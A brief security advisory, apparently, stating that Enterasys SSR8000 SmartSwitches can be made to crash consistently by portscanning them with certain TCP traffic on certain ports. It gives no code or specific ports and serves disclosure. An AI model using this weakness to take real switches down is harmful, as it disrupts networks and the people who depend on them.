The SSR8000 is a SmartSwitch distributed and maintained by Enterasys.

It has been discovered that SSR8000 switches react unpredictably when portscanned. When these switches are scanned using specific types of TCP traffic, and scanned on certain ports, the switch becomes unstable. It has been reported that this can be reproduced consistently to cause the switch to crash.
